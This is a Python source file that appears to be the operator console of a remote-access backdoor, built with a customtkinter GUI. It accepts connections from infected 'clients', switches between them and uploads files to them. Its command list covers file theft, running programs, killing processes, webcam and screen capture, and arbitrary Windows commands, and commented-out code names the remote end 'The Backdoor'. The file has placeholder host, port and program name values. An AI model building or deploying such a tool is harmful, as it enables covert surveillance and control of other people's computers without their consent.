import socket
import threading
import os
import customtkinter as ctk
import time

listCommand = """
List of Command :
- Download NAME : downloads a file from the client.
- Upload NAME : uploads a file to the client.
- Start NAME : runs a program or file on the client.
- Kill PID or NAME : terminates a process by name or ID.
- Restart : restarts the client.
- Stop : shuts down the client.
- Change : switches to another active client.
- ListID : shows the list of connected clients.
- Cam NUMBER :
- Screen NUMBER :
- mkdir-del-move-ren : creates, deletes, moves, or renames a file or folder.
- Dir : lists files and folders in the current directory.
- Ipconfig : shows the client's network configuration.
- Ping IP_ADDRESS : checks connectivity to an IP address.
- Systeminfo : displays system information from the client.
- Tasklit : lists currently running processes.
- Help : displays available commands.
- Any CMD command : executes any valid Windows command.
"""

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.bind(("IP_ADRESS", IP_PORT))
client.listen(99)

savepath = os.environ['USERPROFILE'] + "\\AppData\\Roaming\\Microsoft\\"



#     try:
#         conn.send(command.encode())
#     except ConnectionResetError or OSError:
#         print("This Client has been closed")
#         del listID[clientIDC]
#         ChooseClient()
#         continue



#     elif command[:8].lower() == "download":
#         with open(command[9:], "wb") as f:
#             conn.settimeout(2)
#             try:
#                 while True:
#                     data = conn.recv(1024)
#                     f.write(data)
#             except socket.timeout:
#                 print("Download has ended.")
#             finally:
#                 conn.settimeout(None)

#     elif command[:3].lower() == "cam":
#         with open("captureCam.png", "wb") as f:
#             conn.settimeout(2)
#             try:
#                 while True:
#                     data = conn.recv(1024)
#                     f.write(data)
#             except socket.timeout:
#                 print("Download cam has ended.")
#             finally:
#                 conn.settimeout(None)


#     elif command[:6].lower() == "screen":
#         with open("captureScreen.png", "wb") as f:
#             conn.settimeout(2)
#             try:
#                 while True:
#                     data = conn.recv(1024)
#                     f.write(data)
#             except socket.timeout:
#                 print("Download screen has ended.")
#             finally:
#                 conn.settimeout(None)

#     else:
#         conn.settimeout(2)
#         try:
#             while True:
#                 data = conn.recv(1024)
#                 print(data.decode())
#         except socket.timeout:
#             conn.settimeout(None)
#         except ConnectionResetError:
#             print("The Backdoor has been closed")
#             break
#         except Exception as e:
#             print("This command does not exist.")
#             print(e)

app = ctk.CTk()
listID = {}

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")


def handle_client():
    while True:
        global conntemp, addrtemp, clientID
        conntemp, addrtemp = client.accept()
        clientID = conntemp.recv(1024).decode()
        listID[clientID] = conntemp, addrtemp
        allid = ""
        for clientID, addrtemp in listID.items():
            allid += f"{clientID} &&& {addrtemp[1]}\n"
        listid.configure(text="\nList of ID :\n\n" + allid)

def ChooseClient():
    global conn, addr, clientIDC
    clientIDC = app.entry.get()
    app.entry.delete(0, ctk.END)
    if clientIDC in listID:
        conn = listID[clientIDC][0]
        addr = listID[clientIDC][1]
        app.label.configure(text="Chosen client : " + clientIDC)
    else:
        app.label.configure(text="Not a client")

def Upload():
    fileUpload = str(app.entry.get())
    message= "upload " + fileUpload
    conn.send(message.encode())
    app.entry.delete(0, ctk.END)
    print(fileUpload)
    try:
        with open(fileUpload, "rb") as f:
            conn.sendall(f.read())
        print(conn.recv(1024).decode())
    except:
        print("File doesn't exist")



thread = threading.Thread(target=handle_client, daemon=True)
thread.start()

listidframe = ctk.CTkFrame(app, width=300, height=100, corner_radius=1)
listidframe.pack(side="right")

listid = ctk.CTkLabel(listidframe, text="List of ID :", width=200, height=50, font=("Arial", 20))
listid.pack(side="right")

app.title("NOM PROGRAMME")
app.geometry("1200x700")

app.label = ctk.CTkLabel(app, text="Choose your client.", width=200, height=50, font=("Arial", 20))
app.label.pack(side="top")

app.entry = ctk.CTkEntry(app, width=600, height=50, font=("Arial", 20))
app.entry.pack(side="top")

app.ChangeButton = ctk.CTkButton(app, text="Change Client", command=ChooseClient, width=200, height=50, font=("Arial", 20))
app.ChangeButton.pack(side="left", pady=50)

app.UploadButton = ctk.CTkButton(app, text="Upload File", command=Upload, width=200, height=50, font=("Arial", 20))
app.UploadButton.pack(side="left", pady=50)

app.mainloop()